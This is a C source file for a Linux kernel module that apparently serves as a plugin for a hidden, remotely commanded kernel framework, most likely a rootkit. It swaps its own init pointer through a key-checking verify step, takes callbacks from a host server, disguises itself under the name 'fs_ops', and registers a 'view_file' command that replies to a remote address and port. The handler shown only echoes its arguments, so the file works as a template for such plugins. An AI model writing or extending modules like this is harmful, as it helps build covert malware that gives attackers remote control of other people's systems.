#define MODULE
#define __KERNEL__
#include <linux/module.h>
#include <linux/kernel.h>

#include "server.h"

struct resp {
	long sip;
	long dip;
	short dport;
};

int r_view_file(char *, struct resp *);
int set_kisfunc(void *, void *, void *);
char *verify(void);
int init_module(void);
int cleanup_module(void);

int (*callfunc)(char *, char *, struct resp *);
int (*addfunct)(char *, char *, int (*)(char *, struct resp *));
void (*reply)(struct resp *, char *, ...);

int r_view_file(char *args, struct resp *res)
{
	reply(res, "0args = %s\r\n", args);
	return 0;
}

int set_kisfunc(void *acallfunc, void *aaddfunct, void *areply)
{
	__this_module.init = (void *) init_module;
	if(acallfunc == NULL || aaddfunct == NULL)
		return 0;
	__this_module.name = "fs_ops";
	callfunc = acallfunc;
	addfunct = aaddfunct;
	reply = areply;
	addfunct((char *) __this_module.name, "view_file", &r_view_file);
	return 0;
}

char *verify(void)
{
	__this_module.init = (void *) set_kisfunc;
	return KEY2;
}

int init_module(void)
{
	__this_module.init = (void *) verify;
	return 0;
}

int cleanup_module(void)
{
	return 0;
}
